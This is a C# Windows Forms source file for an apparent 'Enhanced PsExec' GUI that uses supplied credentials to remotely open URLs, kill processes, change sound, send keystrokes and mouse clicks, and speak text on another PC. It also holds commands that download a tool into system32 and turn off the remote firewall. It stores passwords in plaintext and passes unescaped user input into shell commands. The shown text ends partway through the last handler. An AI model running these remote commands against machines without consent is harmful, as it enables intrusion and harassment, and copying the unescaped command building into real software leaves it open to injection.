using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Speech.Recognition;
using EnhancedPsExec;
using System.Net.NetworkInformation;

namespace EnhancedPsExecGUI
{
    public partial class epsexecForm : Form
    {
        public epsexecForm()
        {
            InitializeComponent();
            //Create right click menu..
            ContextMenuStrip s = new ContextMenuStrip();

            // add one right click menu item named as hello           
            ToolStripMenuItem loadRightclick = new ToolStripMenuItem();
            ToolStripMenuItem saveRightclick = new ToolStripMenuItem();
            ToolStripMenuItem hideInBarRightclick = new ToolStripMenuItem();
            alwaysOnTopRightclick = new ToolStripMenuItem();
            loadRightclick.Text = "Load";
            loadRightclick.Image = this.loadSetting.Image;

            saveRightclick.Text = "Save";
            saveRightclick.Image = this.saveToolStripMenuItem.Image;

            alwaysOnTopRightclick.Text = "Always On Top";
            alwaysOnTopRightclick.Image = this.alwaysOnTopToolStripMenuItem.Image;

            hideInBarRightclick.Text = "Hide In Taskbar";
            hideInBarRightclick.Image = this.hideInTaskbarToolStripMenuItem.Image;

            // add the clickevent of hello item
            loadRightclick.Click += (o, e) => loadToolStripMenuItem.PerformClick();
            saveRightclick.Click += (o, e) => saveToolStripMenuItem.PerformClick();
            alwaysOnTopRightclick.Click += (o, e) =>
            {
                alwaysOnTopToolStripMenuItem.PerformClick();
                //this.TopMost = !this.TopMost;
                //alwaysOnTopRightclick.Checked = this.TopMost;
                //alwaysOnTopToolStripMenuItem.Checked = this.TopMost;
            };
            hideInBarRightclick.Click += (o, e) =>
            {
                hideInTaskbarToolStripMenuItem.PerformClick();
                //this.ShowInTaskbar = !this.ShowInTaskbar;
                //hideInBarRightclick.Checked = !this.ShowInTaskbar;
                //hideInTaskbarToolStripMenuItem.Checked = !this.ShowInTaskbar;
            };
            // add the item in right click menu
            s.Items.Add(loadRightclick);
            s.Items.Add(saveRightclick);
            s.Items.Add(alwaysOnTopRightclick);
            s.Items.Add(hideInBarRightclick);
            // attach the right click menu with form
            this.ContextMenuStrip = s;
        }
        ToolStripMenuItem alwaysOnTopRightclick;
        public string IP = "";
        public string username = "";
        public string password = "";
        public string fileName = "c21f969b5f03d33d43e04f8f136e7682";
        public bool fileJustGotEdited = false;
        public SpeechRecognitionEngine recog = new SpeechRecognitionEngine();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(epsexecForm));

        public keyboard keyboardForm = null;
        public scriptingHowTo howto;

        public Process injectedCmdProc;

        // resize
        public int incByX = 0;
        public int incByY = 0;

        public bool noPaExec = false; //dont_use_paexec_on_remote_pc

        public bool ignoreNotConnected = false;
        public bool ignoreIpEmpty = false;
        public PrefForm prefForm;
        public string configPath = "config\\config.ini";

        public string connectedOutputStr = "";
        private void Form1_Load(object sender, EventArgs e)
        {
            prefForm = new PrefForm(this);
            
            // ---
            recog.LoadGrammarAsync(new DictationGrammar());
            recog.SetInputToDefaultAudioDevice();
            recog.SpeechRecognized += new EventHandler<SpeechRecognizedEventArgs>(recog_SpeechRecognized);

            void loadFile(string filePath)
            {

                string[] lines = File.ReadAllLines(filePath);
                bool run = false;
                foreach (string line in lines)
                {
                    if (line.StartsWith("ip="))
                        ipBox.Text = line.Substring(line.IndexOf("ip=") + 3);

                    if (line.StartsWith("username="))
                        usrBox.Text = line.Substring(line.IndexOf("username=") + 9);

                    if (line.StartsWith("password="))
                        passwordBox.Text = line.Substring(line.IndexOf("password=") + 9);

                    if (line.StartsWith("url="))
                        urlBox.Text = line.Substring(line.IndexOf("url=") + 4);

                    if (line.StartsWith("tabs="))
                    {
                        ushort tbs = ushort.Parse(line.Substring(line.IndexOf("tabs=") + 5));
                        tabsBox.Value = tbs < 1 || tbs > ushort.MaxValue ? 1 : tbs;
                    }

                    if (line.StartsWith("delaybefore="))
                        delayBeforeBox.Value = ushort.Parse(line.Substring(line.IndexOf("delaybefore=") + 12));

                    if (line.StartsWith("delaybetween="))
                        delayBetweenBox.Value = ushort.Parse(line.Substring(line.IndexOf("delaybetween=") + 13));

                    // after checking case-sensitive parts, we can get the party started.
                    string lineL = line.ToLower();

                    if (lineL == "invisible" || lineL == "invisible=true")
                        invisibleBox.Checked = true;

                    if (lineL == "incognito" || lineL == "incognito=true")
                        incognitoBox.Checked = true;

                    if (lineL == "openurl" || lineL == "openurl=yes")
                        run = true;

                    if (lineL == "newwindow" || lineL == "newwindow=true" || lineL == "nw=true")
                        newWindowBox.Checked = true;

                    // Close Process
                    if (line.StartsWith("processes=("))
                    {
                        killBtn.Enabled = true;
                        string processes = line.Substring(11, line.Substring(11).Length - 2);

                        foreach (string prcs in processes.Split(','))
                        {
                            processesBox.Items.Add(prcs);
                        }
                    }

                    if (lineL == "caseinsensitive=true")
                        caseInsensitiveBox.Checked = true;

                    if (lineL == "autoclear=true")
                        autoClearBox.Checked = true;

                    if (lineL == "everythingexcept=true")
                        excludeBox.Checked = true;

                    // SOUND
                    if (line.StartsWith("volume="))
                    {
                        volumeBox.Value = ushort.Parse(line.Substring(line.IndexOf("volume=") + 7));
                        percentLabel.Text = $"{volumeBox.Value}%";
                    }

                    //Mouse&Keyboard
                    if (line.StartsWith("mouseX="))
                        moveMouseXBox.Text = line.Substring(line.IndexOf("mouseX=") + 7);

                    if (line.StartsWith("mouseY="))
                        moveMouseYBox.Text = line.Substring(line.IndexOf("mouseY=") + 7);

                    // misc2
                    if (line.StartsWith("copyLocation="))
                        getFileLocationBox.Text = line.Substring(line.IndexOf("copyLocation=") + 13);

                    if (line.StartsWith("copyToLocation="))
                        saveToBox.Text = line.Substring(line.IndexOf("copyToLocation=") + 15);
                }
                if (run)
                    RunBtn_Click(sender, e);
            }

            
            string[] passedInArgs = Environment.GetCommandLineArgs();

            if (passedInArgs.Length > 1)
            {
                fileName = passedInArgs[1];
                this.Text = $"{fileName.Split('\\').Last()} - Control Panel";
                this.saveToolStripMenuItem.Text = $"Save {fileName.Split('\\').Last()}";
                loadFile(fileName);
            }
            fileJustGotEdited = false;

            ///////////////////////////////////////////
            ///// get configuration
            if (!File.Exists(configPath))
            {
                File.WriteAllLines(configPath, new string[]{
                    "; Settings",
                    "; Feel free to edit this",
                    "; Do not get rid of any setting.set it to true / false",
                    "",
                    "ignore_ip_warn                 = true",
                    "ignore_not_connected_warn      = false",
                    "always_on_top                  = false",
                    "hide_in_taskbar                = false",
                    "dont_use_paexec_on_remote_pc   = false"
                    });
            }

            IniParser.FileIniDataParser parser = new IniParser.FileIniDataParser();
            
            IniParser.Model.IniData data = parser.ReadFile(configPath);

            //this.ignoreIpEmpty = Boolean.Parse(data.GetKey("ignore_ip_warn"));
            //this.ignoreNotConnected = Boolean.Parse(data.GetKey("ignore_not_connected_warn"));

            
            this.ignoreIpEmpty = Boolean.Parse(data.GetKey("ignore_ip_warn"));
            this.ignoreNotConnected = Boolean.Parse(data.GetKey("ignore_not_connected_warn"));
            //Thread.Sleep(50000);
            //this.alwaysOnTopToolStripMenuItem.Checked = Boolean.Parse(data.GetKey("always_on_top"));
            
            this.TopMost = Boolean.Parse(data.GetKey("always_on_top"));

            this.hideInTaskbarToolStripMenuItem.Checked = Boolean.Parse(data.GetKey("hide_in_taskbar"));
            this.ShowInTaskbar = !hideInTaskbarToolStripMenuItem.Checked;
            
            this.noPaExec = Boolean.Parse(data.GetKey("dont_use_paexec_on_remote_pc"));
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == Keys.Tab || keyData == (Keys.Shift | Keys.Tab))
                return false; // STOP return true indicates that it had been handled.
            return base.ProcessCmdKey(ref msg, keyData);
        }
        private void RunBtn_Click(object sender, EventArgs e)
        {

            IP = ipBox.Text;
            username = usrBox.Text;
            password = passwordBox.Text;

            string url = urlBox.Text;
            ushort tabs = (ushort)tabsBox.Value;

            ushort delayBefore = (ushort)delayBeforeBox.Value;
            ushort delayBetween = (ushort)delayBetweenBox.Value;

            string incognito = incognitoBox.Checked ? "-i" : "";
            string newWindow = newWindowBox.Checked ? "-nw" : "";
            string invisible = invisibleBox.Checked ? "-invis" : "";
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "openurl.exe",
                    Arguments = $"-ip {IP} -u {username} -p {password} -url {url} -n {tabs} -dbt {delayBetween} -dbf {delayBefore} {incognito} {invisible} {newWindow}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            proc.Close();
        }

        private void TerminateChromeBtn_Click(object sender, EventArgs e)
        {
            IP = ipBox.Text;
            username = usrBox.Text;
            password = passwordBox.Text;

            ushort delay = (ushort)delayTerminate.Value;
            if (injectedCmdProc == null)
            {
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "psexec.exe",
                        Arguments = $"\\\\{IP} -u {username} -p {password} -s cmd.exe /c timeout /t {delay} & taskkill /F /IM chrome.exe /T",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                proc.Close();
            }
            else
                injectedCmdProc.StandardInput.WriteLine($"timeout /t {delay} && taskkill /F /IM chrome.exe /T");
            Thread.Sleep(1500);
            Console.WriteLine(connectedOutputStr);
        }

        private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void CreditsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CreditsForm creditsFormBox = new CreditsForm(this);
            creditsFormBox.Show();
        }

        private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            List<string> lines = new List<string>();
            // Home tab
            if (ipBox.Text != "")
                lines.Add($"ip={ipBox.Text}");
            if (usrBox.Text != "")
                lines.Add($"username={usrBox.Text}");
            if (passwordBox.Text != "")
                lines.Add($"password={passwordBox.Text}");
            lines.Add("\n\n");

            // URL tab
            if (urlBox.Text != "")
                lines.Add($"url={urlBox.Text}");
            if (tabsBox.Value > 1)
                lines.Add($"tabs={tabsBox.Value}");

            if (invisibleBox.Checked)
                lines.Add("invisible=true");
            if (incognitoBox.Checked)
                lines.Add("incognito=true");
            if (newWindowBox.Checked)
                lines.Add("newwindow=true");

            if (delayBeforeBox.Value != 100 && delayBeforeBox.Value >= 0)
                lines.Add($"delaybefore={delayBeforeBox.Value}");

            if (delayBetweenBox.Value != 100 && delayBetweenBox.Value >= 0)
                lines.Add($"delaybetween={delayBetweenBox.Value}");
            lines.Add("\n\n");
            // Process Control
            if (processesBox.Visible)
            {
                lines.Add($"processes=(");
                int i = 0;
                foreach (string lineTaskToKill in processesBox.Items)
                {
                    if (i != 0 && i != 1)
                    {
                        string taskToKill = lineTaskToKill.Split(' ')[0];
                        if (i == processesBox.Items.Count - 1)
                            lines[lines.IndexOf(lines.Last())] += $"{taskToKill}) ";
                        else
                            lines[lines.IndexOf(lines.Last())] += $"{taskToKill},";
                    }
                    i++;
                }

                if (autoClearBox.Checked)
                    lines.Add("autoclear=true");

                if (caseInsensitiveBox.Checked)
                    lines.Add("caseinsensitive=true");

                if (excludeBox.Checked)
                    lines.Add("everythingexcept=true");
            }
            lines.Add("\n\n");
            // SOUND
            if (volumeBox.Value != 70)
                lines.Add($"volume={volumeBox.Value}");

            lines.Add("\n\n");
            // Mouse&Keyboard
            if (moveMouseXBox.Text != "")
                lines.Add($"mouseX={moveMouseXBox.Text}");

            if (moveMouseYBox.Text != "")
                lines.Add($"mouseY={moveMouseYBox.Text}");
            lines.Add("\n\n");


            //remote copy
            if (saveToBox.Text.Length > 1)
                lines.Add("copyToLocation=" + saveToBox.Text);

            if (getFileLocationBox.Text.Length > 1)
                lines.Add("copyLocation=" + getFileLocationBox.Text);
            lines.Add("\n\n");

            // KEEP THIS AT END
            if (fileName != "c21f969b5f03d33d43e04f8f136e7682")
            {
                fileJustGotEdited = false;
                File.WriteAllLines(fileName, lines);
                return;
            }
            using (SaveFileDialog fbd = new SaveFileDialog())
            {
                fbd.Filter = "Enhanced Psexec files | *.epsx";
                fbd.FileName = "config.epsx";
                fbd.Title = "Save A epsx file";
                if (fbd.ShowDialog() == DialogResult.OK)
                {
                    string filepath = fbd.FileName;
                    fileName = filepath;
                    File.WriteAllLines(filepath, lines);
                }

                this.Text = (fileName == "c21f969b5f03d33d43e04f8f136e7682") ? "Enhanced-PsExec Control Panel" : $"{fileName.Split('\\').Last()} - Control Panel";
                this.saveToolStripMenuItem.Text = (fileName == "c21f969b5f03d33d43e04f8f136e7682") ? "Save as" : $"Save {fileName.Split('\\').Last()}";

            }
            fileJustGotEdited = false;
        }

        private void LoadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //string fileName = Interaction.InputBox("Enter the file name:", "Load Config", "config.txt");
            string filePath = "";


            using (OpenFileDialog fbd = new OpenFileDialog())
            {
                fbd.Filter = "Enhanced Psexec File | *.epsx";
                fbd.Title = "Load A epsx File type";

                if (fbd.ShowDialog() == DialogResult.OK)
                    filePath = fbd.FileName.ToString();
                else
                    return;
            }

            string[] lines = File.ReadAllLines(filePath);
            bool run = false;
            foreach (string line in lines)
            {

                if (line.StartsWith("ip="))
                    ipBox.Text = line.Substring(line.IndexOf("ip=") + 3);

                if (line.StartsWith("username="))
                    usrBox.Text = line.Substring(line.IndexOf("username=") + 9);

                if (line.StartsWith("password="))
                    passwordBox.Text = line.Substring(line.IndexOf("password=") + 9);

                if (line.StartsWith("url="))
                    urlBox.Text = line.Substring(line.IndexOf("url=") + 4);

                if (line.StartsWith("tabs="))
                {
                    ushort tbs = ushort.Parse(line.Substring(line.IndexOf("tabs=") + 5));
                    tabsBox.Value = tbs < 1 || tbs > ushort.MaxValue ? 1 : tbs;
                }

                if (line.StartsWith("delaybefore="))
                    delayBeforeBox.Value = ushort.Parse(line.Substring(line.IndexOf("delaybefore=") + 12));

                if (line.StartsWith("delaybetween="))
                    delayBetweenBox.Value = ushort.Parse(line.Substring(line.IndexOf("delaybetween=") + 13));

                // after checking case-sensitive parts, we can get the party started.
                string lineL = line.ToLower();

                if (lineL == "invisible" || lineL == "invisible=true")
                    invisibleBox.Checked = true;

                if (lineL == "incognito" || lineL == "incognito=true")
                    incognitoBox.Checked = true;

                if (lineL == "openurl" || lineL == "openurl=yes")
                    run = true;

                if (lineL == "newwindow" || lineL == "newwindow=true" || lineL == "nw=true")
                    newWindowBox.Checked = true;

                // Close Process
                if (line.StartsWith("processes=("))
                {
                    string processes = line.Substring(11, line.Substring(11).Length - 2);

                    foreach (string prcs in processes.Split(','))
                    {
                        processesBox.Items.Add(prcs);
                    }
                }

                if (lineL == "caseinsensitive=true")
                    caseInsensitiveBox.Checked = true;

                if (lineL == "autoclear=true")
                    autoClearBox.Checked = true;

                if (lineL == "everythingexcept=true")
                    excludeBox.Checked = true;

                // SOUND
                if (line.StartsWith("volume="))
                {
                    volumeBox.Value = ushort.Parse(line.Substring(line.IndexOf("volume=") + 7));
                    percentLabel.Text = $"{volumeBox.Value}%";
                }

                //Mouse&Keyboard
                if (line.StartsWith("mouseX="))
                    moveMouseXBox.Text = line.Substring(line.IndexOf("mouseX=") + 7);

                if (line.StartsWith("mouseY="))
                    moveMouseYBox.Text = line.Substring(line.IndexOf("mouseY=") + 7);

                // misc2
                if (line.StartsWith("copyToLocation="))
                    saveToBox.Text = line.Substring(line.IndexOf("copyToLocation=") + 15);

                if (line.StartsWith("copyLocation="))
                    getFileLocationBox.Text = line.Substring(line.IndexOf("copyLocation=") + 13);

            }
            fileJustGotEdited = false;
            fileName = filePath;
            if (run)
                RunBtn_Click(sender, e);
        }

        private void any_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.All;
        }

        private void any_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop, false);

            MessageBox.Show("This feature is not and will not be developed\nsince you need to go through hell to drag and drop with administrative privileges.\nVisit: https://stackoverflow.com/a/50665247/9100289 ");
        }

        private void SaveIcon_Click(object sender, EventArgs e)
        {
            saveToolStripMenuItem.PerformClick();
        }

        private void LoadSetting_Click(object sender, EventArgs e)
        {
            loadToolStripMenuItem.PerformClick();
        }

        private void VolumeBox_Scroll(object sender, EventArgs e)
        {
            percentLabel.Text = $"{volumeBox.Value}%";
        }

        private void MuteLabel_Click(object sender, EventArgs e)
        {
            if (injectedCmdProc == null)
            {
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "psexec.exe",
                        Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -d -s -accepteula nircmd.exe cmdwait {soundDelayBox.Value} nircmd mutesysvolume 1",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                proc.Close();
            }else
                injectedCmdProc.StandardInput.WriteLine($"nircmd.exe cmdwait {soundDelayBox.Value} nircmd mutesysvolume 1");

        }

        private void UnmuteLabel_Click(object sender, EventArgs e)
        {
            if (injectedCmdProc == null)
            {
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "psexec.exe",
                        Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -d -s -accepteula nircmd.exe cmdwait {soundDelayBox.Value} nircmd mutesysvolume 0",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                proc.Close();
            }else
                injectedCmdProc.StandardInput.WriteLine($"nircmd.exe cmdwait {soundDelayBox.Value} nircmd mutesysvolume 0");
        }

        private void SoundRunBtn_Click(object sender, EventArgs e)
        {
            if (injectedCmdProc == null)
            {
                
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "psexec.exe",
                        Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -d -s -accepteula nircmd.exe cmdwait {soundDelayBox.Value} nircmd setsysvolume {655 * volumeBox.Value}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                proc.Close();
            }else
                injectedCmdProc.StandardInput.WriteLine($"nircmd.exe cmdwait {soundDelayBox.Value} nircmd.exe setsysvolume {655 * volumeBox.Value}");
        }
        private void RunBeepSoundBtn_Click(object sender, EventArgs e)
        {
            // if not connected
            if (injectedCmdProc == null || noPaExec) {

                var proc2 = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "psexec.exe",
                        Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -d -i -accepteula nircmd.exe beep {frequencySoundBox.Value} {durationSoundBox.Value}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,

                        CreateNoWindow = true
                    }
                };
                proc2.Start();
                proc2.Close();
             }else
                injectedCmdProc.StandardInput.WriteLine($"paexec.exe -accepteula -d -i nircmd.exe beep {frequencySoundBox.Value} {durationSoundBox.Value}");
        }

        private void GetReloadBtn_Click(object sender, EventArgs e)
        {
            //if (injectedCmdProc == null)
            //  return;
            string filter = "";

            if (filterTextBox.Text.Trim() != "")
            {
                filter = " | findstr";
                if (caseInsensitiveBox.Checked)
                    filter += " /I";
                if (excludeBox.Checked)
                    filter += " /V";
                filter += $" {filterTextBox.Text}";
            }

            connectedOutputStr = "";
            injectedCmdProc.StandardInput.WriteLine("tasklist" + filter);
            
            Console.WriteLine("command: " + "tasklist" + filter);
            Thread.Sleep(750);
            string output = "";
            bool start = false;
            if (filterTextBox.Text.Trim() != "")
                start = true;

            foreach (string str in connectedOutputStr.Split('\n'))
            {
                if (str.StartsWith("Image Name"))
                    start = true;

                if (start)
                    if (str.Length > 2)
                        output += str + "\n";
            }

            if (autoClearBox.Checked)
                processesBox.Items.Clear();

            // add to list
            foreach (string line in output.Split('\n'))
                processesBox.Items.Add(line);
            
            // rem
            if (filterTextBox.Text.Trim() != "")
                processesBox.Items.RemoveAt(0);
            processesBox.Visible = true;
            processesLabel.Visible = true;
            killBtn.Enabled = true;

        }

        private void KillBtn_Click(object sender, EventArgs e)
        {

            foreach (string lineTaskToKill in processesBox.SelectedItems)
            {
                string taskToKill = lineTaskToKill.Split(' ')[0];
                Thread.Sleep((ushort)processDelay.Value);
                if (injectedCmdProc == null)
                {

                    var proc2 = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "psexec.exe",
                            Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s cmd.exe /c taskkill /F /IM {taskToKill} /T",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,

                            CreateNoWindow = true
                        }
                    };

                    proc2.Start();
                    proc2.Close();
                }
                else
                    this.injectedCmdProc.StandardInput.WriteLine($"start cmd.exe /c taskkill /F /IM {taskToKill} /T");

            }

        }

        private void ClearBtn_Click(object sender, EventArgs e)
        {
            processesBox.Items.Clear();
        }

        private void HowToUseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            howToUse howToUseForm = new howToUse();
            howToUseForm.Show();
        }


        private void TtsRunBtn_Click(object sender, EventArgs e)
        {
            string maleVoice = maleVoiceBox.Checked ? "-s" : "";
            //string toSay = ttsBox.Text;
            var proc2 = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "psexec.exe",
                    Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -d -i {maleVoice} -accepteula nircmd.exe cmdwait {ttsDelayBox.Value} speak text \"{ttsBox.Text}\" {ttsSpeedBox.Value} {ttsVolumeBox.Value}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,

                    CreateNoWindow = true
                }
            };
            proc2.Start();
            proc2.Close();
        }

        private void runMouseClick(object sender, EventArgs e)
        {
            var name = (Button)sender;
            string buttonType = name.Name;
            string leftRightMiddle = "";

            if (buttonType == "mouseFullClickBtn")
                buttonType = "click";
            else if (buttonType == "doubleClickBtn")
                buttonType = "dblclick";
            else if (buttonType == "downClickBtn")
                buttonType = "down";
            else if (buttonType == "upClickBtn")
                buttonType = "up";

            if (leftMouseBtn.Checked)
                leftRightMiddle = "left";
            else if (rightMouseBtn.Checked)
                leftRightMiddle = "right";
            else if (middleMouseBtn.Checked)
                leftRightMiddle = "middle";

            if (injectedCmdProc == null || noPaExec)
            {
                var proc2 = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "psexec.exe",
                        Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -i -accepteula nircmd.exe cmdwait {clickDelayBox.Value} sendmouse {leftRightMiddle} {buttonType}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,

                        CreateNoWindow = true
                    }
                };
                proc2.Start();
                proc2.Close();
            } else
                this.injectedCmdProc.StandardInput.WriteLine($"paexec.exe -s -i -accepteula nircmd.exe cmdwait {clickDelayBox.Value} sendmouse {leftRightMiddle} {buttonType}");
        }

        private void MoveBtn_Click(object sender, EventArgs e)
        {
            string moveX = moveMouseXBox.Text;
            string moveY = moveMouseYBox.Text;

            // if not connected
            if (injectedCmdProc == null || noPaExec)
            {
                var proc2 = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "psexec.exe",
                        Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -i -accepteula nircmd.exe cmdwait {moveMouseDelayBox.Value} setcursor {moveX} {moveY}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,

                        CreateNoWindow = true
                    }
                };
                proc2.Start();
                proc2.Close();
            }
            else
                this.injectedCmdProc.StandardInput.WriteLine($"paexec.exe -s -i -accepteula nircmd.exe cmdwait {moveMouseDelayBox.Value} setcursor {moveX} {moveY}");
        }

        private void SendKeyboardTextBtn_Click(object sender, EventArgs e)
        {
            string sendMe = "";

            int i = 0;
            foreach (char c in sendKeyboardBox.Text)
            {
                if (i % 15 == 0)
                    sendMe += " ";
                switch (c)
                {
                    case '\r':
                        sendMe += "+enter+";
                        break;
                    case ' ':
                        sendMe += "spc+";
                        break;


                    case '!':
                        sendMe += " shift+1 ";
                        break;
                    case '@':
                        sendMe += " shift+2 ";
                        break;
                    case '#':
                        sendMe += " shift+3 ";
                        break;
                    case '%':
                        sendMe += " shift+5 ";
                        break;
                    case '^':
                        sendMe += " shift+6 ";
                        break;
                    case '&':
                        sendMe += " shift+7 ";
                        break;
                    case '*':
                        sendMe += " shift+8 ";
                        break;
                    case '(':
                        sendMe += " shift+9 ";
                        break;
                    case ')':
                        sendMe += " shift+0 ";
                        break;


                    default:
                        if (c != '\n')
                            if (Encoding.ASCII.GetBytes(c.ToString())[0] >= 65 && Encoding.ASCII.GetBytes(c.ToString())[0] <= 90)
                                sendMe += $" shift+{c} ";
                            else
                                sendMe += $"{c}+";
                        else
                            sendMe += "";
                        break;
                }
                i++;
            }
            // 15
            sendMe = sendMe.Replace("\n", "");
            sendMe = sendMe.Replace("\r", "");
            //Console.WriteLine(sendMe);

            if (injectedCmdProc == null || noPaExec)
            {
                var proc2 = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "psexec.exe",
                        Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -i -accepteula nircmd.exe cmdwait {sendKeyboardDelayBox.Value} sendkeypress {sendMe}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,

                        CreateNoWindow = true
                    }
                };
                proc2.Start();
                proc2.Close();
            }
            else
                injectedCmdProc.StandardInput.WriteLine($"paexec.exe -d -s -i -accepteula nircmd.exe cmdwait {sendKeyboardDelayBox.Value} sendkeypress {sendMe}");
        }

        private void DownloadNirBtn_Click(object sender, EventArgs e)
        {
            string powershellCommand = "wget \"\"\"http://www.nirsoft.net/utils/nircmd-x64.zip\"\"\" -OutFile C:\\windows\\system32\\nircmd.zip; ";
            powershellCommand += "Expand-Archive -Force C:\\windows\\system32\\nircmd.zip -DestinationPath C:\\windows\\system32; ";
            powershellCommand += "del C:\\windows\\system32\\nircmd.zip";

            var proc2 = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "psexec.exe",
                    Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -d -accepteula powershell.exe /c {powershellCommand}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,

                    CreateNoWindow = true
                }
            };
            proc2.Start();
            proc2.Close();
            //injectedCmdProc.StandardInput.WriteLine($"paexec -i -s -d  powershell.exe /c {powershellCommand}");

        }


        private void OpenScannerBtn_Click(object sender, EventArgs e)
        {
            scannerForm scForm = new scannerForm(this);
            scForm.Show();
        }

        private void AlwaysOnTopToolStripMenuItem_change(object sender, EventArgs e)
        {
            this.TopMost = alwaysOnTopToolStripMenuItem.Checked;
            alwaysOnTopRightclick.Checked = this.TopMost;

            List<string> lines = new List<string>();
            lines.Add("; Settings");
            lines.Add(";   Feel free to edit this");
            lines.Add(";   Do not get rid of any setting. set it to true/false");
            lines.Add("");
            lines.Add("ignore_ip_warn                 = " + ignoreIpEmpty.ToString().ToLower());
            lines.Add("ignore_not_connected_warn      = " + ignoreNotConnected.ToString().ToLower());
            lines.Add("always_on_top                  = " + this.TopMost.ToString().ToLower());
            lines.Add("hide_in_taskbar                = " + (!this.ShowInTaskbar).ToString().ToLower());
            lines.Add("dont_use_paexec_on_remote_pc   = " + (noPaExec.ToString().ToLower()));

            try
            {
                prefForm.alwaysOnTopBox.Checked = this.TopMost;
            }
            catch (Exception)
            {
                // DO NOT FUCKING REMOVE THIS OR EVERYTHING GOES TO SHIT
            }
            File.WriteAllLines(configPath, lines.ToArray());
        }

        private void NircmdAboutLabel_Click(object sender, EventArgs e)
        {
            MessageBox.Show("NirCmd is a command-line utility that allows you to do some useful tasks\nWithout displaying any user interface And it is required for all of the features in the Misc tab.", "NirCmd?", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void FirewallRun_Click(object sender, EventArgs e)
        {
            string network_command = "";
            if (networkOffBox.Checked)
                network_command = "netsh advfirewall set allprofiles state off";
            
            else if (networkOnBox.Checked)
                network_command = "netsh advfirewall set allprofiles state on";
            
            else if (networkSmbBox.Checked)
                network_command = "netsh advfirewall firewall set rule group=\"File and Printer Sharing(SMB-In)\" new profile=private & netsh advfirewall firewall set rule name=\"File and Printer Sharing(SMB-In)\" dir=in new enable=Yes";
            
            var proc2 = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "psexec.exe",
                    Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -accepteula {network_command}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,

                    CreateNoWindow = true
                }
            };
            
            proc2.Start();
            proc2.Close();
        }

        private void EpsexecForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (/*fileName == "c21f969b5f03d33d43e04f8f136e7682" || */fileJustGotEdited)
            {
                var result = MessageBox.Show("Would you like to save your file?", "You have unsaved changes", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Warning);
                if (result == DialogResult.Yes)
                    saveToolStripMenuItem.PerformClick();
                else if (result == DialogResult.Cancel)
                    e.Cancel = true;

            }
            if (this.injectedCmdProc != null) {
                this.injectedCmdProc.StandardInput.WriteLine("exit");
                
                this.injectedCmdProc.Close();
            }
        }
        private void on_Edit(object sender, EventArgs e)
        {
            fileJustGotEdited = true;
        }

        private void SpeakNowBtn_Click(object sender, EventArgs e)
        {
            if (speakNowBtn.Text == "Stop")
            {
                recog.RecognizeAsyncStop();
                speakNowBtn.Text = "Enter By saying";
            }
            else
            {
                speakNowBtn.Text = "Stop";
                recog.RecognizeAsync(RecognizeMode.Multiple);
            }
        }

        private void recog_SpeechRecognized(object sender, SpeechRecognizedEventArgs e)
        {
